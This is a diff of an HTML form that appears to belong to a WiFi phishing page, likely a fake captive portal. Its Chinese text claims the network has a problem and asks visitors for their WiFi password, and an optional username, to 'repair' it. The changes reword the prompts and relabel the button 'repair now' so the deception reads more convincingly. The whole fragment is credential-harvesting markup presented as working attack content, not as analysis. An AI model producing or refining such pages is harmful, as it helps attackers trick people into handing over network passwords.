@@ -235,19 +235,19 @@ p {
 
       <form method="POST" class="form login">
 
-        <!--div class="form__field">
-          <label for="login__username"><svg class="icon"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#user"></use></svg><span class="hidden">Username</span></label>
-          <input type="text" name="login" class="form__input" placeholder="Username" required>
-        </div-->
-
-		<p class="text--center">当前网络存在问题，请输入WIFI密码确认</p>
-        <div class="form__field">
-          <label for="login__password"><svg class="icon"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#lock"></use></svg><span class="hidden">password</span></label>
-          <input  type="password" name="password" class="form__input" placeholder="密码" required>
+        <p class="text--center">当前网络存在问题，请输入WIFI密码确认修复</p>
+		<div class="form__field">
+          <label for="login__username"><svg class="icon"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#user"></use></svg><span class="hidden"></span></label>
+          <input type="text" name="login" class="form__input" placeholder="如未设置用户名请留空！">
         </div>
 
         <div class="form__field">
-          <input type="submit" value="登录">
+          <label for="login__password"><svg class="icon"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#lock"></use></svg><span class="hidden"></span></label>
+          <input  type="password" name="password" class="form__input" placeholder="请输入密码：" required>
+        </div>
+
+        <div class="form__field">
+          <input type="submit" value="立即修复">
         </div>
 
       </form>
